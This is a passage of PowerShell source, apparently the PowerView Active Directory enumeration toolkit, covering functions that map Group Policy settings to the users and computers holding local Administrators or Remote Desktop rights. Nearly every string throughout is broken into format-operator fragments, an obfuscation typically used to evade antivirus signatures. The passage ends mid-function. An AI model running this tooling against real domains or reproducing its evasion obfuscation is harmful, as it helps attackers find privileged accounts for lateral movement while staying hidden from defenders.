        if ($PSBoundParameters[("{1}{0}{2}" -f's','Tomb','tone')]) { $SearcherArguments[("{0}{1}{2}" -f 'Tom','bston','e')] = $Tombstone }
        if ($PSBoundParameters[("{1}{2}{0}" -f'al','Cre','denti')]) { $SearcherArguments[("{2}{0}{1}"-f'redent','ial','C')] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f'main','Do')]) { $ConvertArguments[("{1}{0}" -f 'in','Doma')] = $Domain }
        if ($PSBoundParameters[("{1}{0}"-f 'er','Serv')]) { $ConvertArguments[("{1}{2}{0}" -f 'r','Se','rve')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'Cr','tial','eden')]) { $ConvertArguments[("{0}{1}{2}{3}" -f 'Cred','e','nti','al')] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters[("{2}{1}{0}"-f 'y','t','Identi')]) { $SearcherArguments[("{0}{1}" -f 'Identi','ty')] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ ("{1}{2}{0}{3}"-f'plPa','GptT','m','th') = ("$GPOPath\MACHINE\Microsoft\Windows "+('NT{'+'0}SecEdit'+'{0}Gp'+'tTm'+'pl'+'.inf') -f  [CHar]92) }
            if ($PSBoundParameters[("{2}{1}{0}"-f'al','edenti','Cr')]) { $ParseArgs[("{1}{2}{0}{3}" -f 'den','C','re','tial')] = $Credential }

            
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains ("{1}{0}{2}{3}"-f' Memb','Group','ersh','ip'))) {
                $Memberships = @{}

                
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters[("{3}{2}{1}{0}" -f'sToSIDs','ber','olveMem','Res')]) {
                        
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch ("{0}{1}"-f'^','S-1-.*')) {
                                    $ConvertToArguments = @{("{1}{0}{2}" -f'b','O','jectName') = $Member}
                                    if ($PSBoundParameters[("{1}{0}"-f 'ain','Dom')]) { $ConvertToArguments[("{0}{1}{2}" -f 'D','oma','in')] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match ("{0}{1}{2}"-f'Adminis','t','rators')) {
                                $GroupSID = ("{2}{1}{0}"-f'544','2-','S-1-5-3')
                            }
                            elseif ($Groupname -match ("{3}{1}{4}{2}{0}" -f 'ktop','mote','Des','Re',' ')) {
                                $GroupSID = ("{0}{2}{1}{3}"-f'S-','-','1-5-32','555')
                            }
                            elseif ($Groupname -match ("{1}{0}"-f'ts','Gues')) {
                                $GroupSID = ("{0}{1}{3}{2}" -f 'S-','1-','46','5-32-5')
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{("{2}{0}{1}" -f'b','jectName','O') = $Groupname}
                                if ($PSBoundParameters[("{1}{0}{2}"-f 'oma','D','in')]) { $ConvertToArguments[("{1}{0}" -f 'main','Do')] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty ("{2}{0}{4}{1}{3}" -f'isp','N','GPOD','ame','lay') $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty ("{0}{1}" -f 'GPONa','me') $GPOName
                    $GPOGroup | Add-Member Noteproperty ("{1}{2}{0}"-f'th','GP','OPa') $GPOPath
                    $GPOGroup | Add-Member Noteproperty ("{1}{0}"-f'ype','GPOT') ("{1}{2}{4}{0}{3}"-f'u','Re','strictedG','ps','ro')
                    $GPOGroup | Add-Member Noteproperty ("{1}{0}"-f'ters','Fil') $Null
                    $GPOGroup | Add-Member Noteproperty ("{1}{0}{2}" -f 'oupN','Gr','ame') $GroupName
                    $GPOGroup | Add-Member Noteproperty ("{0}{1}{2}"-f'Gro','u','pSID') $GroupSID
                    $GPOGroup | Add-Member Noteproperty ("{0}{2}{1}"-f'GroupMe','erOf','mb') $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty ("{1}{0}{2}" -f'o','Gr','upMembers') $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, ("{1}{0}{3}{2}" -f'owerV','P','GPOGroup','iew.'))
                    $GPOGroup
                }
            }

            
            $ParseArgs =  @{
                ("{0}{4}{1}{3}{2}" -f 'G','up','ath','sXMLp','ro') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters[("{3}{1}{2}{4}{5}{0}" -f 'oSIDs','l','veM','Reso','em','bersT')]) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch ("{1}{0}" -f'S-1-.*','^')) {

                                
                                $ConvertToArguments = @{("{2}{0}{1}" -f 'am','e','ObjectN') = $Groupname}
                                if ($PSBoundParameters[("{2}{1}{0}"-f'in','a','Dom')]) { $ConvertToArguments[("{0}{1}"-f'Do','main')] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty ("{2}{3}{0}{1}{4}" -f 'pla','yNam','G','PODis','e') $GPODisplayName
                $_ | Add-Member Noteproperty ("{0}{1}"-f'GPO','Name') $GPOName
                $_ | Add-Member Noteproperty ("{2}{1}{0}" -f 'e','POTyp','G') ("{0}{5}{3}{2}{4}{1}"-f 'GroupPolicy','s','fe','re','rence','P')
                $_.PSObject.TypeNames.Insert(0, ("{0}{1}{2}{3}"-f'PowerV','iew.G','POGrou','p'))
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{4}{2}{3}"-f 'PSSh','ould','ces','s','Pro'}, '')]
    [OutputType({"{1}{6}{7}{4}{3}{8}{5}{0}{2}"-f 'lGr','P','oupMapping','w.','ie','ca','ower','V','GPOUserLo'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{3}{2}{4}{5}"-f 'Disti','n','ishedN','gu','am','e'}, {"{2}{1}{0}"-f 'ame','ntN','SamAccou'}, {"{0}{1}" -f'Nam','e'})]
        [String]
        $Identity,

        [String]
        [ValidateSet({"{0}{1}{2}" -f'Administra','to','rs'}, {"{0}{3}{1}{2}" -f 'S-','-3','2-544','1-5'}, 'RDP', {"{3}{2}{0}{5}{4}{1}" -f't','sers','e Desk','Remot','U','op '}, {"{0}{2}{3}{1}"-f 'S-','55','1-5-32','-5'})]
        $LocalGroup = ("{2}{0}{1}"-f 'd','ministrators','A'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'AD','SPat','h'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}{4}" -f'rol','C','Domain','ont','ler'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{2}{1}{0}"-f 'l','neLeve','O'}, {"{0}{1}{2}"-f 'Su','b','tree'})]
        [String]
        $SearchScope = ("{1}{0}" -f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f'n','Domai')]) { $CommonArguments[("{1}{0}{2}"-f 'omai','D','n')] = $Domain }
        if ($PSBoundParameters[("{1}{2}{0}"-f'r','Se','rve')]) { $CommonArguments[("{1}{2}{0}"-f 'r','Serv','e')] = $Server }
        if ($PSBoundParameters[("{1}{0}{3}{2}"-f 'S','Search','ope','c')]) { $CommonArguments[("{2}{1}{0}" -f 'e','Scop','Search')] = $SearchScope }
        if ($PSBoundParameters[("{2}{0}{3}{1}"-f's','Size','Re','ultPage')]) { $CommonArguments[("{2}{0}{1}" -f 'ge','Size','ResultPa')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'Ser','mit','rTimeLi','ve')]) { $CommonArguments[("{1}{2}{3}{0}{4}"-f 'mi','Serve','rTim','eLi','t')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}"-f'T','bstone','om')]) { $CommonArguments[("{1}{0}{2}" -f 'm','To','bstone')] = $Tombstone }
        if ($PSBoundParameters[("{1}{0}{2}"-f'red','C','ential')]) { $CommonArguments[("{0}{1}{2}" -f 'C','re','dential')] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters[("{1}{0}" -f 'ity','Ident')]) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw ('[Get'+'-Domain'+'GPOU'+'ser'+'Lo'+'cal'+'GroupM'+'apping'+']'+' '+'Un'+'a'+'ble '+'to'+' '+'ret'+'rieve'+' '+'S'+'ID '+'fo'+'r '+'ident'+'ity'+' '+"'$Identity'")
            }
        }
        else {
            
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match ("{1}{0}"-f'1-5','S-')) {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match ("{0}{1}"-f'Ad','min')) {
            $TargetLocalSID = ("{3}{2}{1}{0}" -f'44','-5','32','S-1-5-')
        }
        else {
            
            $TargetLocalSID = ("{0}{1}{2}"-f 'S','-1-5-32-5','55')
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose ('[Ge'+'t-Domai'+'nGPOU'+'ser'+'L'+'ocalGro'+'up'+'Mappi'+'ng] '+'Enu'+'m'+'erating '+'nested'+' '+'g'+'roup '+'me'+'mbe'+'r'+'ships '+'for:'+' '+"'$TargetSid'")
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties ("{1}{0}"-f'jectsid','ob') -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose ('[G'+'et-'+'D'+'omainGPOUserLoc'+'al'+'Gro'+'upMapp'+'ing] '+'Target'+' '+'lo'+'calgr'+'oup '+'SI'+'D: '+"$TargetLocalSID")
        Write-Verbose ('[Get-Domai'+'n'+'GPOU'+'serLoca'+'l'+'Gro'+'upM'+'appi'+'ng] '+'Effec'+'t'+'ive'+' '+'t'+'arget '+'doma'+'i'+'n '+'SIDs'+': '+"$TargetSIDs")

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            
            Get-DomainOU @CommonArguments -Raw -Properties ("{3}{4}{0}{2}{1}" -f'distin','hedname','guis','n','ame,') -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties ("{1}{6}{0}{4}{2}{3}{5}"-f'tname,disting','d','edn','a','uish','me','nshos') -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties ("{0}{2}{3}{1}"-f'dnshostn','e','a','m') -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties ("{4}{7}{11}{0}{9}{10}{5}{12}{3}{1}{13}{2}{6}{8}{14}" -f 'c','am',',d','ntn','sa','e,sa','isti','ma','nguishedname','ountt','yp','c','maccou','e',',objectsid')

                        $IsGroup = @(("{2}{1}{0}" -f'35456','4','268'),("{1}{0}"-f '57','2684354'),("{2}{3}{0}{1}"-f'8','70912','53','6'),("{2}{1}{0}"-f '6870913','3','5')) -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}{2}"-f'ec','Obj','tName') $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}"-f 'ctDN','Obje') $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}{2}"-f 'S','Object','ID') $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{0}{1}"-f'Dom','ain') $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{0}{1}{2}" -f'I','sGro','up') $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{2}{0}{1}"-f 'spla','yName','GPODi') $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}{2}"-f'OGui','GP','d') $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{2}{1}{0}" -f 'th','OPa','GP') $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}"-f 'pe','GPOTy') $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{2}{3}{0}" -f'me','Co','ntaine','rNa') $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}{2}" -f 'ute','Comp','rName') $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, ("{3}{1}{4}{7}{5}{2}{6}{0}" -f 'ng','rV','al','Powe','i','.GPOLoc','GroupMappi','ew'))
                        $GPOLocalGroupMapping
                    }
                }
            }

            
            Get-DomainSite @CommonArguments -Properties ("{5}{3}{2}{4}{8}{1}{7}{0}{6}" -f 'ednam','ng',',d','teobjectbl','ist','si','e','uish','i') -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties ("{1}{7}{4}{2}{3}{8}{0}{6}{5}{9}" -f'ame,dist','sam','nttyp','e,sam','ou','name,objects','inguished','acc','accountn','id')

                    $IsGroup = @(("{2}{0}{1}"-f'545','6','26843'),("{1}{3}{2}{0}"-f '7','2','43545','68'),("{2}{0}{1}"-f '87091','2','536'),("{1}{2}{0}" -f '13','536870','9')) -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{2}{0}{3}"-f'a','Ob','jectN','me') $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{0}{2}{1}"-f 'Ob','ctDN','je') $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{0}{1}" -f'Obje','ctSID') $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{2}{1}{0}"-f'up','sGro','I') $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}" -f'omain','D') $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{4}{3}{1}{0}{2}"-f'yNam','spla','e','ODi','GP') $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}{2}" -f'Gu','GPO','id') $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}" -f'th','GPOPa') $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{1}{0}"-f'POType','G') $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{2}{0}{3}{4}{1}" -f 'ne','me','Contai','r','Na') $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ("{2}{0}{3}{1}"-f'm','erName','Co','put') $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add(("{1}{0}{2}{3}{4}"-f'o','PowerView.GPOL','cal','Gro','upMapping'))
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}" -f 'es','s','PSShouldPro','c'}, '')]
    [OutputType({"{1}{8}{4}{7}{3}{6}{5}{0}{2}" -f'm','Po','ber','ComputerLocalGrou','erView','e','pM','.GGPO','w'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}{2}{3}" -f 'C','ompu','terId','entity'})]
    Param(
        [Parameter(Position = 0, ParameterSetName = "Comp`UtEriDEn`Tity", Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f'mputerNam','e','Co'}, {"{0}{1}{2}"-f'C','om','puter'}, {"{1}{4}{2}{3}{0}"-f 'edName','D','ingui','sh','ist'}, {"{3}{2}{4}{1}{0}"-f 'tName','oun','A','Sam','cc'}, {"{1}{0}"-f 'me','Na'})]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = "Oui`den`TiTy")]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet({"{1}{2}{4}{0}{3}" -f'to','Adm','inis','rs','tra'}, {"{2}{0}{3}{1}" -f'-1-5-','4','S','32-54'}, 'RDP', {"{4}{0}{1}{2}{3}"-f 'e',' De','sktop Us','ers','Remot'}, {"{2}{3}{1}{0}" -f'555','2-','S-1-5-','3'})]
        $LocalGroup = ("{1}{2}{0}{3}"-f 'istra','A','dmin','tors'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADS','Path'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}" -f 'Do','ontroller','ainC','m'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}{2}"-f'OneL','eve','l'}, {"{2}{1}{0}"-f 'tree','ub','S'})]
        [String]
        $SearchScope = ("{1}{0}{2}"-f'e','Subtr','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[("{0}{1}"-f 'Do','main')]) { $CommonArguments[("{0}{1}{2}" -f 'D','om','ain')] = $Domain }
        if ($PSBoundParameters[("{0}{1}" -f 'Se','rver')]) { $CommonArguments[("{0}{1}"-f 'Serve','r')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}"-f'Se','ope','archSc')]) { $CommonArguments[("{0}{1}{2}" -f 'SearchSc','o','pe')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{4}{3}{0}" -f'Size','e','R','tPage','sul')]) { $CommonArguments[("{1}{3}{4}{2}{0}"-f 'e','Re','eSiz','sultPa','g')] = $ResultPageSize }
        if ($PSBoundParameters[("{4}{3}{2}{1}{0}"-f 't','mi','eLi','erverTim','S')]) { $CommonArguments[("{2}{1}{0}{3}" -f'ime','rT','Serve','Limit')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{0}"-f'stone','Tom','b')]) { $CommonArguments[("{1}{0}" -f 'ne','Tombsto')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Cred','entia','l')]) { $CommonArguments[("{1}{2}{0}" -f 'l','Creden','tia')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{2}{1}{0}"-f'rIdentity','te','Compu')]) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties ("{1}{0}{2}{3}{4}"-f'dnam','distinguishe','e,dn','s','hostname')

            if (-not $Computers) {
                throw ('[Get-D'+'o'+'main'+'GPOCompu'+'terLoc'+'alGro'+'upMap'+'ping] '+'C'+'ompu'+'ter '+"$ComputerIdentity "+'not'+' '+'fou'+'n'+'d. '+'Try'+' '+'a '+'ful'+'ly '+'quali'+'f'+'ied'+' '+'ho'+'st '+'name'+'.')
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter (("{2}{0}{1}"-f 'ink=*',')','(gpl')) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname) "
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch ("{1}{0}"-f'or','Err'))) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter ("{0}{1}{2}" -f'(gplin','k','=*)') | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @(("{0}{2}{1}"-f '2','56','684354'),("{2}{0}{1}"-f '8','435457','26'),("{2}{0}{1}" -f'87091','2','536'),("{0}{1}"-f'53687','0913')) -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{2}{0}{1}{3}" -f'er','N','Comput','ame') $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{3}{0}{2}" -f 'Na','Obj','me','ect') $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{0}{2}" -f 'jec','Ob','tDN') $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{2}{1}{0}" -f'ctSID','je','Ob') $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{0}"-f 'sGroup','I') $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{0}{2}" -f 'PODisplayN','G','ame') $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{0}"-f'd','GPOGui') $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{1}{0}" -f'ath','GPOP') $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ("{2}{0}{1}"-f 'O','Type','GP') $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add(("{3}{1}{4}{7}{6}{2}{0}{5}" -f'pMem','.','Grou','PowerView','GPOComputerL','ber','cal','o'))
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{4}{0}{2}"-f 'd','PSSho','Process','u','l'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f'our','ce','S'}, {"{0}{1}" -f 'Nam','e'})]
        [String]
        $Policy = ("{1}{2}{0}"-f'n','Dom','ai'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}{4}{5}"-f'o','nt','D','mainCo','roll','er'})]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{2}{1}{0}"-f 'r','rve','Se')]) { $SearcherArguments[("{0}{1}"-f 'Ser','ver')] = $Server }
        if ($PSBoundParameters[("{4}{3}{2}{0}{1}" -f'Lim','it','ime','T','Server')]) { $SearcherArguments[("{3}{0}{2}{1}" -f'rv','TimeLimit','er','Se')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Crede','n','tial')]) { $SearcherArguments[("{1}{2}{0}" -f 'l','C','redentia')] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[("{1}{0}" -f'er','Serv')]) { $ConvertArguments[("{1}{0}" -f'r','Serve')] = $Server }
        if ($PSBoundParameters[("{0}{3}{1}{2}" -f'Creden','a','l','ti')]) { $ConvertArguments[("{2}{1}{0}" -f 'ntial','ede','Cr')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{0}{1}" -f'D','omain')]) {
            $SearcherArguments[("{2}{0}{1}"-f 'oma','in','D')] = $Domain
            $ConvertArguments[("{0}{1}"-f'Doma','in')] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments[("{0}{1}{2}" -f'Ide','ntit','y')] = '*'
        }
        elseif ($Policy -eq ("{0}{1}" -f 'Domai','n')) {
            $SearcherArguments[("{1}{0}"-f'ty','Identi')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq ("{4}{0}{1}{2}{3}"-f 'mai','nCont','roll','er','Do')) -or ($Policy -eq 'DC')) {
            $SearcherArguments[("{0}{2}{1}"-f'Ide','ity','nt')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments[("{0}{1}"-f 'Iden','tity')] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            
